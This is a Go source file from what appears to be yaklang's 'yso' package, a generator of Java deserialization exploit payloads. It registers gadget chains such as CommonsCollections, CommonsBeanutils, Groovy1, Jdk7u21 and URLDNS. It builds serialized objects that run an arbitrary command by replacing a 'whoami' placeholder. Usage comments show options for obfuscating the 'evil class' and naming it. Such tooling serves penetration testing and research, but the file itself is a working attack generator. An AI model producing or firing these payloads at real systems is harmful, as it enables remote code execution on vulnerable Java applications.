package yso

import (
	"fmt"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yserx"
	"reflect"
)

const (
	BeanShell1GadgetName              = "BeanShell1"
	CommonsCollections1GadgetName     = "CommonsCollections1"
	CommonsCollections5GadgetName     = "CommonsCollections5"
	CommonsCollections6GadgetName     = "CommonsCollections6"
	CommonsCollections7GadgetName     = "CommonsCollections7"
	CommonsCollectionsK3GadgetName    = "CommonsCollectionsK3"
	CommonsCollectionsK4GadgetName    = "CommonsCollectionsK4"
	Groovy1GadgetName                 = "Groovy1"
	Click1GadgetName                  = "Click1"
	CommonsBeanutils1GadgetName       = "CommonsBeanutils1"
	CommonsBeanutils183NOCCGadgetName = "CommonsBeanutils183NOCC"
	CommonsBeanutils192NOCCGadgetName = "CommonsBeanutils192NOCC"
	CommonsCollections2GadgetName     = "CommonsCollections2"
	CommonsCollections3GadgetName     = "CommonsCollections3"
	CommonsCollections4GadgetName     = "CommonsCollections4"
	CommonsCollections8GadgetName     = "CommonsCollections8"
	CommonsCollectionsK1GadgetName    = "CommonsCollectionsK1"
	CommonsCollectionsK2GadgetName    = "CommonsCollectionsK2"
	JBossInterceptors1GadgetName      = "JBossInterceptors1"
	JSON1GadgetName                   = "JSON1"
	JavassistWeld1GadgetName          = "JavassistWeld1"
	Jdk7u21GadgetName                 = "Jdk7u21"
	Jdk8u20GadgetName                 = "Jdk8u20"
	URLDNS                            = "URLDNS"
	FindGadgetByDNS                   = "FindGadgetByDNS"
	FindClassByBomb                   = "FindClassByBomb"
)

type GadgetInfo struct {
	Name            string
	GeneratorName   string
	Generator       any
	NameVerbose     string
	Help            string
	YakFun          string
	SupportTemplate bool
}

func (g *GadgetInfo) GetNameVerbose() string {
	return g.NameVerbose
}
func (g *GadgetInfo) GetName() string {
	return g.Name
}
func (g *GadgetInfo) GetHelp() string {
	return g.Help
}
func (g *GadgetInfo) IsSupportTemplate() bool {
	return g.SupportTemplate
}

var AllGadgets = map[string]*GadgetInfo{
	//BeanShell1GadgetName:              {Name: BeanShell1GadgetName, NameVerbose: "BeanShell1", Help: "", SupportTemplate: false},
	//Click1GadgetName:                  {Name: Click1GadgetName, NameVerbose: "Click1", Help: "", SupportTemplate: true},
	//CommonsBeanutils1GadgetName:       {Name: CommonsBeanutils1GadgetName, NameVerbose: "CommonsBeanutils1", Help: "", SupportTemplate: true},
	//CommonsBeanutils183NOCCGadgetName: {Name: CommonsBeanutils183NOCCGadgetName, NameVerbose: "CommonsBeanutils183NOCC", Help: "使用String.CASE_INSENSITIVE_ORDER作为comparator，去除了cc链的依赖", SupportTemplate: true},
	//CommonsBeanutils192NOCCGadgetName: {Name: CommonsBeanutils192NOCCGadgetName, NameVerbose: "CommonsBeanutils192NOCC", Help: "使用String.CASE_INSENSITIVE_ORDER作为comparator，去除了cc链的依赖", SupportTemplate: true},
	//CommonsCollections1GadgetName:     {Name: CommonsCollections1GadgetName, NameVerbose: "CommonsCollections1", Help: "", SupportTemplate: false},
	//CommonsCollections2GadgetName:     {Name: CommonsCollections2GadgetName, NameVerbose: "CommonsCollections2", Help: "", SupportTemplate: true},
	//CommonsCollections3GadgetName:     {Name: CommonsCollections3GadgetName, NameVerbose: "CommonsCollections3", Help: "", SupportTemplate: true},
	//CommonsCollections4GadgetName:     {Name: CommonsCollections4GadgetName, NameVerbose: "CommonsCollections4", Help: "", SupportTemplate: true},
	//CommonsCollections5GadgetName:     {Name: CommonsCollections5GadgetName, NameVerbose: "CommonsCollections5", Help: "", SupportTemplate: false},
	//CommonsCollections6GadgetName:     {Name: CommonsCollections6GadgetName, NameVerbose: "CommonsCollections6", Help: "", SupportTemplate: false},
	//CommonsCollections7GadgetName:     {Name: CommonsCollections7GadgetName, NameVerbose: "CommonsCollections7", Help: "", SupportTemplate: false},
	//CommonsCollections8GadgetName:     {Name: CommonsCollections8GadgetName, NameVerbose: "CommonsCollections8", Help: "", SupportTemplate: true},
	//CommonsCollectionsK1GadgetName:    {Name: CommonsCollectionsK1GadgetName, NameVerbose: "CommonsCollectionsK1", Help: "", SupportTemplate: true},
	//CommonsCollectionsK2GadgetName:    {Name: CommonsCollectionsK2GadgetName, NameVerbose: "CommonsCollectionsK2", Help: "", SupportTemplate: true},
	//CommonsCollectionsK3GadgetName:    {Name: CommonsCollectionsK3GadgetName, NameVerbose: "CommonsCollectionsK3", Help: "", SupportTemplate: false},
	//CommonsCollectionsK4GadgetName:    {Name: CommonsCollectionsK4GadgetName, NameVerbose: "CommonsCollectionsK4", Help: "", SupportTemplate: false},
	//Groovy1GadgetName:                 {Name: Groovy1GadgetName, NameVerbose: "Groovy1", Help: "", SupportTemplate: false},
	//JBossInterceptors1GadgetName:      {Name: JBossInterceptors1GadgetName, NameVerbose: "JBossInterceptors1", Help: "", SupportTemplate: true},
	//JSON1GadgetName:                   {Name: JSON1GadgetName, NameVerbose: "JSON1", Help: "", SupportTemplate: true},
	//JavassistWeld1GadgetName:          {Name: JavassistWeld1GadgetName, NameVerbose: "JavassistWeld1", Help: "", SupportTemplate: true},
	//Jdk7u21GadgetName:                 {Name: Jdk7u21GadgetName, NameVerbose: "Jdk7u21", Help: "", SupportTemplate: true},
	//Jdk8u20GadgetName:                 {Name: Jdk8u20GadgetName, NameVerbose: "Jdk8u20", Help: "", SupportTemplate: true},
	//URLDNS:                            {Name: URLDNS, NameVerbose: URLDNS, Help: "通过URL对象触发dnslog", SupportTemplate: false},
	//FindGadgetByDNS:                   {Name: FindGadgetByDNS, NameVerbose: FindGadgetByDNS, Help: "通过URLDNS这个gadget探测class,进而判断gadget", SupportTemplate: false},
}

func init() {
	RegisterGadget(GetBeanShell1JavaObject, BeanShell1GadgetName, "BeanShell1", "")
	RegisterGadget(GetClick1JavaObject, Click1GadgetName, "Click1", "")
	RegisterGadget(GetCommonsBeanutils1JavaObject, CommonsBeanutils1GadgetName, "CommonsBeanutils1", "")
	RegisterGadget(GetCommonsBeanutils183NOCCJavaObject, CommonsBeanutils183NOCCGadgetName, "CommonsBeanutils183NOCC", "")
	RegisterGadget(GetCommonsBeanutils192NOCCJavaObject, CommonsBeanutils192NOCCGadgetName, "CommonsBeanutils192NOCC", "")
	RegisterGadget(GetCommonsCollections1JavaObject, CommonsCollections1GadgetName, "CommonsCollections1", "")
	RegisterGadget(GetCommonsCollections2JavaObject, CommonsCollections2GadgetName, "CommonsCollections2", "")
	RegisterGadget(GetCommonsCollections3JavaObject, CommonsCollections3GadgetName, "CommonsCollections3", "")
	RegisterGadget(GetCommonsCollections4JavaObject, CommonsCollections4GadgetName, "CommonsCollections4", "")
	RegisterGadget(GetCommonsCollections5JavaObject, CommonsCollections5GadgetName, "CommonsCollections5", "")
	RegisterGadget(GetCommonsCollections6JavaObject, CommonsCollections6GadgetName, "CommonsCollections6", "")
	RegisterGadget(GetCommonsCollections7JavaObject, CommonsCollections7GadgetName, "CommonsCollections7", "")
	RegisterGadget(GetCommonsCollections8JavaObject, CommonsCollections8GadgetName, "CommonsCollections8", "")
	RegisterGadget(GetCommonsCollectionsK1JavaObject, CommonsCollectionsK1GadgetName, "CommonsCollectionsK1", "")
	RegisterGadget(GetCommonsCollectionsK2JavaObject, CommonsCollectionsK2GadgetName, "CommonsCollectionsK2", "")
	RegisterGadget(GetCommonsCollectionsK3JavaObject, CommonsCollectionsK3GadgetName, "CommonsCollectionsK3", "")
	RegisterGadget(GetCommonsCollectionsK4JavaObject, CommonsCollectionsK4GadgetName, "CommonsCollectionsK4", "")
	RegisterGadget(GetGroovy1JavaObject, Groovy1GadgetName, "Groovy1", "")
	RegisterGadget(GetJBossInterceptors1JavaObject, JBossInterceptors1GadgetName, "JBossInterceptors1", "")
	RegisterGadget(GetJSON1JavaObject, JSON1GadgetName, "JSON1", "")
	RegisterGadget(GetJavassistWeld1JavaObject, JavassistWeld1GadgetName, "JavassistWeld1", "")
	RegisterGadget(GetJdk7u21JavaObject, Jdk7u21GadgetName, "Jdk7u21", "")
	RegisterGadget(GetJdk8u20JavaObject, Jdk8u20GadgetName, "Jdk8u20", "")
	RegisterGadget(GetURLDNSJavaObject, URLDNS, URLDNS, "")
	RegisterGadget(GetFindGadgetByDNSJavaObject, FindGadgetByDNS, FindGadgetByDNS, "")
}
func RegisterGadget(f any, name string, verbose string, help string) {
	var supportTemplate = false
	funType := reflect.TypeOf(f)
	if funType.IsVariadic() && funType.NumIn() == 1 && funType.In(0).Kind() == reflect.Slice && funType.Kind() == reflect.Func {
		supportTemplate = true
	} else {
		if funType.NumIn() > 0 && funType.In(0).Kind() == reflect.String && funType.Kind() == reflect.Func {
			supportTemplate = false
		} else {
			panic("gadget function must be func(options ...GenClassOptionFun) (*JavaObject, error) or func(cmd string) (*JavaObject, error)")
		}
	}
	AllGadgets[name] = &GadgetInfo{
		Name:            name,
		NameVerbose:     verbose,
		Generator:       f,
		GeneratorName:   name,
		Help:            help,
		SupportTemplate: supportTemplate,
		YakFun:          fmt.Sprintf("Get%sJavaObject", name),
	}
}

type JavaObject struct {
	yserx.JavaSerializable
	verbose *GadgetInfo
}

func (a *JavaObject) Verbose() *GadgetInfo {
	return a.verbose
}

var verboseWrapper = func(y yserx.JavaSerializable, verbose *GadgetInfo) *JavaObject {
	return &JavaObject{
		y,
		verbose,
	}
}

type TemplatesGadget func(options ...GenClassOptionFun) (*JavaObject, error)
type RuntimeExecGadget func(cmd string) (*JavaObject, error)

func ConfigJavaObject(templ []byte, name string, options ...GenClassOptionFun) (*JavaObject, error) {
	config := NewClassConfig(options...)
	if config.ClassType == "" {
		config.ClassType = RuntimeExecClass
	}
	classObj, err := config.GenerateClassObject()
	if err != nil {
		return nil, err
	}
	objs, err := yserx.ParseJavaSerialized(templ)
	if err != nil {
		return nil, err
	}
	obj := objs[0]
	err = SetJavaObjectClass(obj, classObj)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, AllGadgets[name]), nil
}
func setCommandForRuntimeExecGadget(templ []byte, name string, cmd string) (*JavaObject, error) {
	objs, err := yserx.ParseJavaSerialized(templ)
	if err != nil {
		return nil, err
	}
	if len(objs) <= 0 {
		return nil, utils.Error("parse gadget error")
	}
	obj := objs[0]
	err = ReplaceStringInJavaSerilizable(obj, "whoami", cmd, 1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, AllGadgets[name]), nil
}

// GetJavaObjectFromBytes 从字节数组中解析并返回第一个Java对象。
// 此函数使用ParseJavaSerialized方法来解析提供的字节序列，
// 并期望至少能够解析出一个有效的Java对象。如果解析失败或者结果为空，
// 函数将返回错误。如果解析成功，它将返回解析出的第一个Java对象。
//
// byt：要解析的字节数组。
// 返回：成功时返回第一个Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// raw := "rO0..." // base64 Java serialized object
//
// bytes = codec.DecodeBase64(raw)~ // base64解码
//
// javaObject, err := yso.GetJavaObjectFromBytes(bytes) // 从字节中解析Java对象
func GetJavaObjectFromBytes(byt []byte) (*JavaObject, error) {
	objs, err := yserx.ParseJavaSerialized(byt)
	if err != nil {
		return nil, err
	}
	if len(objs) <= 0 {
		return nil, utils.Error("parse gadget error")
	}
	obj := objs[0]
	return verboseWrapper(obj, &GadgetInfo{}), nil
}

// GetBeanShell1JavaObject 基于BeanShell1 序列化模板生成并返回一个Java对象。
// 它首先解析预定义的BeanShell1序列化模板，然后在解析出的第一个Java对象中替换预设的占位符为传入的命令字符串。
//
// cmd：要传入Java对象的命令字符串。
// 返回：成功时返回修改后的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command := "ls" // 假设的命令字符串
//
// javaObject, err := yso.GetBeanShell1JavaObject(command)
//
// gadgetBytes,_ = yso.ToBytes(javaObject)
//
// hexPayload = codec.EncodeToHex(gadgetBytes)
//
// println(hexPayload)
func GetBeanShell1JavaObject(cmd string) (*JavaObject, error) {
	objs, err := yserx.ParseJavaSerialized(template_ser_BeanShell1)
	if err != nil {
		return nil, err
	}
	if len(objs) <= 0 {
		return nil, utils.Error("parse gadget error")
	}
	obj := objs[0]
	err = ReplaceStringInJavaSerilizable(obj, "whoami1", cmd, 1)
	if err != nil {
		return nil, err
	}
	//err = ReplaceStringInJavaSerilizable(obj, `"whoami1"`, cmd, 1)
	//if err != nil {
	//	return nil, err
	//}
	return verboseWrapper(obj, AllGadgets["BeanShell1"]), nil
}

// GetCommonsCollections1JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
//
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command := "ls" // 假设的命令字符串
//
// javaObject, err := yso.GetCommonsCollections1JavaObject(command)
//
// gadgetBytes,_ = yso.ToBytes(javaObject)
//
// hexPayload = codec.EncodeToHex(gadgetBytes)
//
// println(hexPayload)
func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections1, "CommonsCollections1", cmd)
}

// GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
//
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command := "ls" // 假设的命令字符串
//
// javaObject, _ = yso.GetCommonsCollections5JavaObject(command)
//
// gadgetBytes,_ = yso.ToBytes(javaObject)
//
// hexPayload = codec.EncodeToHex(gadgetBytes)
//
// println(hexPayload)
func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections5, "CommonsCollections5", cmd)
}

// GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
//
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetCommonsCollections6JavaObject(command)
//
// gadgetBytes,_ = yso.ToBytes(javaObject)
//
// hexPayload = codec.EncodeToHex(gadgetBytes)
//
// println(hexPayload)
func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections6, "CommonsCollections6", cmd)
}

// GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
//
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command := "ls" // 假设的命令字符串
//
// javaObject, _ = yso.GetCommonsCollections7JavaObject(command)
//
// gadgetBytes,_ = yso.ToBytes(javaObject)
//
// hexPayload = codec.EncodeToHex(gadgetBytes)
//
// println(hexPayload)
func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollections7, "CommonsCollections7", cmd)
}

// GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
//
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetCommonsCollectionsK3JavaObject(command)
//
// gadgetBytes,_ = yso.ToBytes(javaObject)
//
// hexPayload = codec.EncodeToHex(gadgetBytes)
//
// println(hexPayload)
// ```
func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollectionsK3, "CommonsCollectionsK3", cmd)
}

// GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
//
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command := "ls" // 假设的命令字符串
//
// javaObject, _ = yso.GetCommonsCollectionsK4JavaObject(command)
//
// gadgetBytes,_ = yso.ToBytes(javaObject)
//
// hexPayload = codec.EncodeToHex(gadgetBytes)
//
// println(hexPayload)
func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_CommonsCollectionsK4, "CommonsCollectionsK4", cmd)
}

// GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
//
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command := "ls" // 假设的命令字符串
//
// javaObject, _ = yso.GetGroovy1JavaObject(command)
//
// gadgetBytes,_ = yso.ToBytes(javaObject)
//
// hexPayload = codec.EncodeToHex(gadgetBytes)
//
// println(hexPayload)
func GetGroovy1JavaObject(cmd string) (*JavaObject, error) {
	return setCommandForRuntimeExecGadget(template_ser_Groovy1, "Groovy1", cmd)
}

// GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。
// 用户可以通过可变参数`options`提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数允许用户定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetClick1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command),
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className),
//	)
func GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_Click1, "Click1", options...)
}

// GetCommonsBeanutils1JavaObject 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(
//
//	 yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//		yso.obfuscationClassConstantPool(),
//		yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsBeanutils1, "CommonsBeanutils1", options...)
}

// GetCommonsBeanutils183NOCCJavaObject 基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。
// 去除了对 commons-collections:3.1 的依赖。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetCommonsBeanutils183NOCCJavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsBeanutils183NOCC, "CommonsBeanutils183NOCC", options...)
}

// GetCommonsBeanutils192NOCCJavaObject 基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。
// 去除了对 commons-collections:3.1 的依赖。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetCommonsBeanutils192NOCCJavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsBeanutils192NOCC, "CommonsBeanutils192NOCC", options...)
}

// GetCommonsCollections2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetCommonsCollections2JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollections2, "CommonsCollections2", options...)
}

// GetCommonsCollections3JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetCommonsCollections3JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollections3, "CommonsCollections3", options...)
}

// GetCommonsCollections4JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetCommonsCollections4JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollections4, "CommonsCollections4", options...)
}

// GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetCommonsCollections8JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollections8, "CommonsCollections8", options...)
}

// GetCommonsCollectionsK1JavaObject 基于Commons Collections <=3.2.1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
//
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetCommonsCollectionsK1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollectionsK1, "CommonsCollectionsK1", options...)
}

// GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetCommonsCollectionsK2JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_CommonsCollectionsK2, "CommonsCollectionsK2", options...)
}

// GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetJBossInterceptors1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_JBossInterceptors1, "JBossInterceptors1", options...)
}

// GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetJSON1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_JSON1, "JSON1", options...)
}

// GetJavassistWeld1JavaObject 基于JavassistWeld1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetJavassistWeld1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	//objs, err := yserx.ParseJavaSerialized(template_ser_JavassistWeld1)
	//if err != nil {
	//	return nil, err
	//}
	//obj := objs[0]
	//return verboseWrapper(obj, AllGadgets["JavassistWeld1"]), nil

	return ConfigJavaObject(template_ser_JavassistWeld1, "JavassistWeld1", options...)
}

// GetJdk7u21JavaObject 基于Jdk7u21 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetJdk7u21JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_Jdk7u21, "Jdk7u21", options...)
}

// GetJdk8u20JavaObject 基于Jdk8u20 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
